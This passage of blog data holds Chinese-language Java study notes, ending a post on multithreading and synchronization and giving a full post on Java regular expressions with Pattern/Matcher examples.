class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TicketWindow</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tickies=<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>)&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(tickies&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                Thread th= Thread.currentThread();<span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">                String th_name=th.getName();<span class=\"comment\">//获取线程名称</span></span><br><span class=\"line\">                System.out.println(th_name+<span class=\"string\">&quot;正在发售&quot;</span>+tickies--+<span class=\"string\">&quot;张票&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">//可能会出现超卖的现象</span></span><br></pre></td></tr></table></figure>\n\n<img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211223234915498.png\" alt=\"image-20211223234915498\" style=\"zoom:67%;\" />\n\n<p>这样就不会出现重复卖票的情况,实现了tickies的共享</p>\n<p>Runnable接口还可以通过匿名对象来实现</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        Runnable target=<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;子线程&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        Thread t=<span class=\"keyword\">new</span> Thread(target);</span><br><span class=\"line\">        t.start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>还可以进一步简化上面的代码</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">test</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">new</span> Thread(<span class=\"keyword\">new</span> Runnable() &#123;</span><br><span class=\"line\">            <span class=\"meta\">@Override</span></span><br><span class=\"line\">            <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span> </span>&#123;</span><br><span class=\"line\">                System.out.println(<span class=\"string\">&quot;子线程&quot;</span>);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//jdk8后更简化</span></span><br><span class=\"line\"><span class=\"keyword\">new</span> Thread(()-&gt;&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;子线程2&quot;</span>);</span><br><span class=\"line\">        &#125;).start();</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h4 id=\"第三种多线程实现方案\"><a href=\"#第三种多线程实现方案\" class=\"headerlink\" title=\"第三种多线程实现方案\"></a>第三种多线程实现方案</h4><h5 id=\"利用Callable-FutureTask接口实现\"><a href=\"#利用Callable-FutureTask接口实现\" class=\"headerlink\" title=\"利用Callable,FutureTask接口实现\"></a>利用Callable,FutureTask接口实现</h5><p><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211224011547555.png\" alt=\"image-20211224011547555\"></p>\n<h5 id=\"线程的常用方法\"><a href=\"#线程的常用方法\" class=\"headerlink\" title=\"线程的常用方法\"></a>线程的常用方法</h5><p>setName //设置线程名称,使之与参数name相同</p>\n<p>getName  //返回该线程的名称</p>\n<p>常用<code>Thread.currentThread().getName()</code></p>\n<p>start //使该线程开始执行,java虚拟机底层调用该线程的start0方法</p>\n<p>run //调用线程对象run方法</p>\n<p>setPriority //更改线程优先级</p>\n<p>getPriority //获取线程的优先级</p>\n<p>sleep //在指定的毫秒数内让当前正在执行的线程休眠</p>\n<p>interrupt //中断线程,但是并没有真正结束线程,往往是中断休眠sleep,转而执行catch中的语句</p>\n<p>yield //是Thread的静态方法,直接<code>Thread.yield()</code>调用即可线程的礼让,让出cpu,让其他线程执行,但让出的时间不确定,所以也不一定礼让成功</p>\n<p>join //线程的插队.插队的线程一旦插队成功,则肯定先执行完插入的线程所有的任务</p>\n<p>案例:创建一个子线程,每隔1s输出hello,输出20次,主线程每隔一秒,输出hi,输出20次,要求:两个完成同时执行,当主线程输出5次后,就让子线程运行完毕,主线程再继续</p>\n<h5 id=\"用户线程和守护线程\"><a href=\"#用户线程和守护线程\" class=\"headerlink\" title=\"用户线程和守护线程\"></a>用户线程和守护线程</h5><p>1.用户线程:也叫工作线程,当线程的任务执行完或通知方式结束</p>\n<p>2.守护线程:一般是为工作线程服务的,当所有的用户线程结束,守护线程自动结束</p>\n<p>3.常见的守护线程:垃圾回收机制</p>\n<h5 id=\"如何把一个子线程设置为守护线程\"><a href=\"#如何把一个子线程设置为守护线程\" class=\"headerlink\" title=\"如何把一个子线程设置为守护线程\"></a>如何把一个子线程设置为守护线程</h5><p><code>myDaemonThread.setDaemon(true)</code>就可以把一个子线程设置为守护线程,主线程结束 它也结束</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_5</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        MyDaemonThread myDaemonThread=<span class=\"keyword\">new</span> MyDaemonThread();</span><br><span class=\"line\">        myDaemonThread.setDaemon(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        myDaemonThread.start();</span><br><span class=\"line\">        <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i=<span class=\"number\">0</span>;i&lt;<span class=\"number\">3</span>;i++)&#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;主线程运行中&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyDaemonThread</span> <span class=\"keyword\">extends</span> <span class=\"title\">Thread</span></span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(<span class=\"keyword\">true</span>) &#123;</span><br><span class=\"line\">            System.out.println(<span class=\"string\">&quot;子线程运行中&quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>主线程结束后,子线程也会结束</p>\n<h5 id=\"线程的生命周期\"><a href=\"#线程的生命周期\" class=\"headerlink\" title=\"线程的生命周期\"></a>线程的生命周期</h5><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211225234147135.png\" style=\"zoom: 80%;\" />\n\n<h4 id=\"线程同步机制\"><a href=\"#线程同步机制\" class=\"headerlink\" title=\"线程同步机制\"></a>线程同步机制</h4><p>在多线程编程中,一些敏感数据不允许被多个线程同时访问,此时就使用同步访问技术,保证数据在任何统一时刻,最多有一个线程访问,以保证数据的完整性</p>\n<p>也可以这样理解:线程同步,即当有一个线程在对内存进行操作时,其他线程都不可以对这个内存地址进行操作,知道该线程完成操作,其他线程才能对该内存地址进行操作</p>\n<h5 id=\"同步具体方法\"><a href=\"#同步具体方法\" class=\"headerlink\" title=\"同步具体方法\"></a>同步具体方法</h5><p>1.同步代码块</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">synchronized</span>(对象)&#123;<span class=\"comment\">//得到对象的锁,才能操作同步代码</span></span><br><span class=\"line\">\t<span class=\"comment\">//需要被同步的代码</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>2.synchronized还可以放在方法声明中,表示整个方法为同步方法</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">m</span><span class=\"params\">(String name)</span></span>&#123;</span><br><span class=\"line\">\t<span class=\"comment\">//需要被同步的代码</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>3.如何理解</p>\n<p>就好像上厕所,A上厕所关上门(上锁),完事出来后(解锁),那么其他人就可以再使用厕所了</p>\n<p>例子</p>\n<p>之前的售票窗口程序,通过继承Runnable接口,虽然实现了票数的共享,但是售票顺序是乱的</p>\n<p><a href=\"#sell\">售票窗口程序</a></p>\n<p>通过线程同步,就可以实现每次只卖一张票,也就是每次只允许一个线程访问tickies变量并执行,这样还可以防止超卖现象</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">S8_1</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> </span>&#123;</span><br><span class=\"line\">         TicketWindow tw=<span class=\"keyword\">new</span> TicketWindow();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口1&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口2&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口3&quot;</span>).start();</span><br><span class=\"line\">         <span class=\"keyword\">new</span> Thread(tw,<span class=\"string\">&quot;窗口4&quot;</span>).start();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">TicketWindow</span> <span class=\"keyword\">implements</span> <span class=\"title\">Runnable</span></span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">int</span> tickies=<span class=\"number\">100</span>;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">boolean</span> loop=<span class=\"keyword\">true</span>;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">synchronized</span> <span class=\"keyword\">void</span> <span class=\"title\">sell</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(tickies&gt;<span class=\"number\">0</span>)&#123;</span><br><span class=\"line\">                Thread th= Thread.currentThread();<span class=\"comment\">//获取当前线程</span></span><br><span class=\"line\">                String th_name=th.getName();<span class=\"comment\">//获取线程名称</span></span><br><span class=\"line\">                System.out.println(th_name+<span class=\"string\">&quot;正在发售&quot;</span>+tickies--+<span class=\"string\">&quot;张票&quot;</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                loop=<span class=\"keyword\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title\">run</span><span class=\"params\">()</span></span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">while</span>(loop)&#123;</span><br><span class=\"line\">            sell();<span class=\"comment\">//sell是一种同步方法</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>由运行结果可知,票按照tickies大小逐次递减卖出,就是不知道为啥,每次只有一到两个线程能抢到cpu资源并且执行</p>\n<p><img src=\"/images/java%E5%A4%9A%E7%BA%BF%E7%A8%8B/image-20211226000540093.png\" alt=\"image-20211226000540093\"></p>\n"},{"title":"java正则表达式","date":"2021-12-06T13:43:24.000Z","description":"java正则","typora-root-url":"..","_content":"\n首先感谢[韩顺平老师的课程](https://www.bilibili.com/video/BV1Eq4y1E79W?p=1&spm_id_from=pageDriver)!!\n\n#### 正则匹配中贪婪模式和非贪婪模式的区别\n\n我个人理解为,贪婪模式情况下,会尽可能多的进行每一次的匹配,非贪婪模式每一次进行匹配都会找尽可能短的满足`?`前条件的字符完成本次匹配\n\n#### java正则简单实现\n\n简单实践,后面记录各个类和方法的信息\n\n```java\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class r1 {\n\n    public static void main(String[] args) {\n        String content=\"2000年5月，JDK1.3、JDK1.4和J2SE1.3相继发布，几周后其获得了Apple公司Mac OS X的工业标准的支持。2001年9月24日，J2EE1.3发布。\" +\n                \"2002年2月26日，J2SE1.4发布。自此Java的计算能力有了大幅提升，与J2SE1.3相比，其多了近62%的类和接口。在这些新特性当中，还提供了广泛的XML支持、安全套接字（Socket）支持（通过SSL与TLS协议）、全新的I/OAPI、正则表达式、日志与断言。\" +\n                \"2004年9月30日，J2SE1.5发布，成为Java语言发展史上的又一里程碑。为了表示该版本的重要性，J2SE 1.5更名为Java SE 5.0（内部版本号1.5.0），\" +\n                \"代号为“Tiger”，Tiger包含了从1996年发布1.0版本以来的最重大的更新，其中包括泛型支持、基本类型的自动装箱、改进的循环、枚举类型、\" +\n                \"格式化I/O及可变参数。\";\n\t\t//匹配数字或者单词\n        Pattern pattern = Pattern.compile(\"\\\\d\\\\d\\\\d\\\\d\");\n        //2.创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        //可以循环匹配\n        while(matcher.find()){\n            //匹配文本放到matcher.group(0)\n            System.out.println(\"找到\"+matcher.group(0));\n        }\n    }\n}\n\n```\n\n##### `matcher.find()`完成的任务:\n\n1.根据指定的规则定位满足规则的子字符串(比如2000)\n\n2.找到后,将子字符串的开始索引记录到matcher对象的属性int[] groups;\n\n![image-20211207000454930](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000454930.png)\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207000542796.png)\n\ngroups[0]=0,把该子字符串的结束的索引+1的值记录到groups[1]=4\n\n3.同时记录oldLast值为子字符串的结束的索引+1,即下次执行find方法时就从记录的索引位置4开始匹配\n\ngroup()源码\n\n```java\npublic String group(int group) {\n        if (first < 0)\n            throw new IllegalStateException(\"No match found\");\n        if (group < 0 || group > groupCount())\n            throw new IndexOutOfBoundsException(\"No group \" + group);\n        if ((groups[group*2] == -1) || (groups[group*2+1] == -1))\n            return null;\n        return getSubSequence(groups[group * 2], groups[group * 2 + 1]).toString();//截取字符串\n    }\n```\n\n1.根据groups[0]和groups[1]的记录位置,从content开始截取,从content开始截取字符串返回就是[0,4),包含0但是不包含索引为4的位置\n\n如果再次执行find方法,仍然按照上面的方法,groups[0]和groups[1]记录本次的开始和结束位置,group[0]记录的是下次!![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207001258292.png)\n\n`Pattern pattern = Pattern.compile(\"(\\\\d\\\\d)(\\\\d\\\\d)\");`加上括号,分组匹配:\n\n根据指定的规则，定位满足规则的子字符串(比如(20)(00))\n\n1.找到后将 子字符串的开始索引 group[0]=0 记录到 matcher 对象的熟悉 int[] groups数组中；\n2.1 groups[0] = 0, 把该子字符串的结束的索引+1的值记录到 groups[1] = 4\n2.2 记录1组()匹配到的子字符串 groups[2] = 0 groups[3] = 2\n2.3 记录2组()匹配到的子字符串 groups[4] = 2 groups[5] = 4\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004146025.png)\n\n2.4 如果有更多的分组，同理\n\n```java\nwhile (matcher.find()) {\n\n            System.out.println(\"找到：\" + matcher.group(0)); // 2000\n            System.out.println(\"第一组匹配到的值: \" + matcher.group(1)); // 2\n            System.out.println(\"第二组匹配到的值: \" + matcher.group(2)); // 000\n            // System.out.println(\"找到：\" + matcher.group(3)); 索引越界\n        }\n```\n\n<img src=\"/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207004834793.png\" style=\"zoom:80%;\" />\n\n3.同时记录 oldLast 的值为 子字符串的结束的 索引+1的值即69，即下次执行find时，就从69开始匹配。\n\n**我的理解是,group[0]永远获取的是每次整个表达式匹配的结果,group(1)和group(2)则是每次匹配到的括号内的内容**\n\n\n\n##### 转义字符的使用\n\n注:在java的正则表达式中,两个\\\\\\\\代表一个\\\n\n```java\npublic class Demo {\n    public static void main(String[] args) {\n        String content = \"abc$(a.bc(123(\";\n\n        // 俩个 \\\\ 字符表示 \\\n        Pattern compile = Pattern.compile(\"\\\\(\");\n        // 2.创建一个匹配器对象\n        Matcher matcher = compile.matcher(content);\n        // 3. 可以循环匹配\n        while (matcher.find()) {\n            // 匹配内容，文本，放到 m.group(0)\n            System.out.println(\"找到：\" + matcher.group(0));\n        }\n    }\n}\n```\n\n#### 区分大小写\n\njava正则表达式默认是区分大小写的,如何实现不区分大小写\n\n- (?i)abc      表示abc都不区分大小写\n- a(?i)bc       表示bc不区分大小写\n- a((?i)b)c     表示只有b不区分大小写\n- `Pattern pat  = Pattern.compile(regEx,pattern.CASE_INSENSITIVE);`开启不区分大小写的匹配,整个regEx都不区分大小写\n\n\n\n#### 关于[ ]的一些注意点\n\n^在[ ]内表示非\n\n[ ]内的任意字符之间都是或的关系\n\n[ ]内的符号就只是一个符号了,不带特殊功能    **注意:在( )内要加转义符**\n\n#### 限定符\n\n| 示例        | 说明                                                        |\n| ----------- | ----------------------------------------------------------- |\n| (abc)*      | 仅包含任意个abc的字符串                                     |\n| m+(abc)*    | 以m开头,后接任意个abc的字符串                               |\n| m+abc?      | 以m开头,后接ab或者abc的字符串                               |\n| [abcd]{3}   | 由abcd中字母组成的任意长度为3的字符串                       |\n| [abcd]{3,}  | 由abcd中字母组成的任意长度不小于3的字符串                   |\n| [abcd]{3,5} | 由abcd中字母组成的任意长度不小于3,不大于5的字符串(左闭右开) |\n\njava匹配默认贪婪匹配\n\n\n\n#### 定位符\n\n定位符,规定要匹配的字符串出现的位置,比如在字符串的开始还是在结束的位置\n\n| 符号 | 含义                   | 示例             | 说明                                                       |\n| ---- | ---------------------- | ---------------- | ---------------------------------------------------------- |\n| ^    | 指定起始字符           | ^[0-9]+[a-z]*    | 以至少1个数字开头,后接任意个小写字母的字符串               |\n| $    | 指定结束字符           | ^[0-9]\\\\-[a-z]+$ | 以1个数字开头后接连字符\"-\",并以至少1个小写字母结尾的字符串 |\n| \\b   | 匹配目标字符串的边界   | er\\\\b            | 匹配forev`er`中的er,但不匹配verb中的er                     |\n| \\B   | 匹配目标字符串的非边界 | er\\\\B            | 匹配v`er`b中的er,但不匹配forever中的er                     |\n\n#### 分组\n\n##### (pattern)\n\n非命名捕获,捕获匹配的子字符串,编号为0的第一个捕获是由整个正则表达式模式匹配的文本(即group(0)),其它捕获结果则根据左括号的顺序从1开始自动编号\n\n##### (?\\<name\\>)\n\n命名捕获,将匹配的字符串捕获到一个组名称或编号名称中,用于name的字符串不能包含任何表单符号,并且不能以数字开头,可以使用单引号替代尖括号,例如(?'name')\n\n```java\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class r1 {\n    public static void main(String[] args) {\n        String content=\"dsfdsfds s7789 nn1189han\";\n//      String regStr=\"^[0-9]+[a-z]+\\\\d+$\";\n        String regStr=\"(?<g1>\\\\d\\\\d)(?<g2>\\\\d\\\\d)\";\n        Pattern pattern=Pattern.compile(regStr);\n        //创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        while (matcher.find()) {\n            System.out.println(\"找到：\" + matcher.group(0)); // 2000\n            System.out.println(\"分组1(根据组名): \"+matcher.group(\"g1\"));\n            System.out.println(\"分组1: \"+matcher.group(1));\n            System.out.println(\"分组2(根据组名): \"+matcher.group(\"g2\"));\n            System.out.println(\"分组2: \"+matcher.group(2));\n        }\n    }\n}\n```\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211207234020782.png)\n\n#### 非捕获分组\n\n##### (?:pattern)\n\n非捕获分组不算入分组内,即不能通过group(i)去访问\n\n```java\nimport java.util.regex.Matcher;\nimport java.util.regex.Pattern;\npublic class r1 {\n    public static void main(String[] args) {\n        String content=\"124张三男士  hell张三先生   张三同学  \";\n//      String regStr=\"^[0-9]+[a-z]+\\\\d+$\";\n        String regStr=\"张三(?:男士|先生|同学)\";//等价于:张三男士|张三先生|张三同学\n        Pattern pattern=Pattern.compile(regStr);\n        //创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        while (matcher.find()) {\n            System.out.println(\"找到：\" + matcher.group(0)); // 2000\n        }\n    }\n}\n\n```\n\n![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211208235406173.png)\n\n##### (?=pattern)\n\n它是一个非捕获匹配,例如,\"windows(?=95|98|NT|2000)\"匹配\"windows2000\"中的\"windows\",但不匹配\"windows10\"中的windows\n\n(理解这个等号的含义即可)\n\n##### (?!pattern)\n\n与上一个刚好相反,例如,\"windows(?=95|98|NT|2000)\"匹配\"windows10\"中的\"windows\",但不匹配\"windows2000\"中的windows\n\n(理解!与=的相反含义)\n\n#### 匹配汉字\n\n`resStr = \"^[\\u0391-\\uffe5]+$\"`\n\n上面的regStr匹配纯汉字\n\n\\u0391-\\uffe5是汉字的编码范围\n\n一些练习:\n\n匹配1-9开头的六位数:  `^[1-9]\\\\d{5}$`\n\n匹配必须以13,14,15,18开头的11位数: `^1[3458]\\\\d{9}$`\n\n匹配小数或者整数 `^[-+]?([1-9]\\\\d*|0)(\\\\.\\\\d+)?$`\n\n\n\n\n\n### 三个常用类\n\n#### Pattern类\n\nPattern对象是一个正则表达式对象,Pattern类没有公共构造方法,(不需要new)要创建一个Pattern对象,调用其公共静态方法,它返回一个Pattern对象,该方法接受一个正则表达式作为它的第一个参数,比如\n\n```java\nPattern p=Pattern.compile(regStr);\n```\n\n##### matches方法\n\n如果只是判断是否满足格式,可以使用Pattern的matches,整体匹配,比较简洁,返回一个bool值,但是只能整体匹配,不能分组\n\n`Pattern.matches(regStr,content)`\n\n### Matcher类\n\nMatcher类是对输入字符进行解释和匹配的引擎,与Pattern类一样,Matcher也没有公共构造方法,需要调用Pattern对象的matcher方法来获得一个Matcher对象,比如\n\n```java\nMatcher matcher= pattern.matcher(content);\n```\n\n##### matcher.start();获取find每一组开始的索引\n\n##### matcher.end();获取find每一组尾部的索引\n\n##### replaceAll();//替换,注意该函数只是返回替换后的结果,并不修改原来conetent\n\n```\npublic class r1 {\n    public static void main(String[] args) {\n        String content=\"我确实是个傻缺\";\n//      String regStr=\"^[0-9]+[a-z]+\\\\d+$\";\n        String regStr=\"确实\";\n        Pattern pattern=Pattern.compile(regStr);\n        //创建一个匹配器对象\n        Matcher matcher= pattern.matcher(content);\n        while (matcher.find()) {\n            String newContent=matcher.replaceAll(\"雀氏\");\n            System.out.println(newContent);\n        }\n    }\n}\n```\n\n\n\n### PatternSyntaxException类\n\nPatternSyntaxException是一个非强制异常类,它表示一个正则表达式中的语法错误\n\n\n\n\n\n#### 分组,捕获,反向引用\n\n1.分组\n\n我们可以用圆括号组成一个比较复杂的匹配模式,那么一个圆括号的部分我们可以看作是一个子表达式(一个分组)\n\n2.捕获\n\n把正则表达式中子表达式/分组匹配的内容,保存澡内存中以数字编号或显式命名的组里,方便后面引用,从左往右,以分组的左括号为标志,第一个为1,0代表整个表达式匹配内容\n\n3.**反向引用**\n\n圆括号的内容被捕获偶,可以在这个括号后被引用,从而写出一个比较使用的匹配模式,这个称为反向引用,这种引用既可以是在正则表达式内部,<u>也可以是在正则表达式外部,内部反向引用用`\\\\分组号`,外部反向引用`$分组号`</u>\n\n例子,匹配回文数\n\n```java\nString regStr=\"(\\\\d)(\\\\d)\\\\2\\\\1\";\n```\n\n---应用示例:\n\n结巴程序:把 类似: \"我....我要....学学学学....编程java!\"   通过正则表达式修改为\"我要学编程java!\"\n\n思路:\n\n1.去掉所有的点\n\n2.去除所有重复字\n\n```java\npublic static void main(String[] args) {\n        String content=\"我....我要....学学学学....编程java!\";\n        //1.去掉所有的点\n        String regStr=\"\\\\.\";\n        Pattern pattern=Pattern.compile(regStr);\n        Matcher matcher= pattern.matcher(content);\n        content=matcher.replaceAll(\"\");\n        System.out.println(content);\n        //2去除所有重复字\n        regStr=\"(.)\\\\1+\";//只会匹配到1-多的字符串\n        pattern=Pattern.compile(regStr);\n        matcher=pattern.matcher((content));\n        content=matcher.replaceAll(\"$1\");//分组的表达式外引用\n        System.out.println(content);\n    \t//第2步的代码也可以用一行代码替换\n        /*content=Pattern.compile(\"(.)\\\\1+\").matcher(content).replaceAll(\"$1\");\n        System.out.println(content);\n        */\n    \n    }\n```\n\n\n\n#### String类中使用正则表达式\n\nString类中可以直接使用\n\n1. replaceAll()方法\n\n2. matches()方法\n\n3. 分割功能    split()方法中可以使用正则表达式\n\n   ```java\n   public class r1 {\n       public static void main(String[] args) {\n           String content=\"hello#abc-jack12smith~河南\";\n           //要求按照#或-或~或数字来分割\n           String[]spilt = content.split(\"#|~|-|\\\\d+\");\n           for(String s : spilt){//类似于foreach\n               System.out.println(s);\n           }\n       }\n   }\n   ```\n\n   ![](/images/java%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/image-20211209124141204.png)\n\n#### 